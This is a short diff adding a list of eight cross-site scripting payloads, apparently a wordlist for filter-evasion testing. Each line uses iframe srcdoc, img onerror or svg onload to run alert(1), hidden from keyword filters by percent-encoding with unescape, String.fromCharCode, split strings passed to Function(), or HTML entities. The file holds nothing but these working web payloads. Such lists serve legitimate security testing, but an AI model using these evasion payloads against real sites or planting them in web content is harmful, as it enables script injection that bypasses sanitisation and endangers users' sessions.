@@ -1,0 +1,8 @@
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6c%65%72%74(1)'))>">
+<iframe srcdoc="<img src=x onerror=Function('al'+'ert(1)')()>">
+<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>
+<iframe srcdoc="<script>al&#x65;rt(1)</script>">
+<svg onload=Function('al'+'ert(1)')()>
+<iframe srcdoc="<script>eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))</script>">
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<iframe srcdoc="<script>Function('al'+'ert(1)')()</script>">
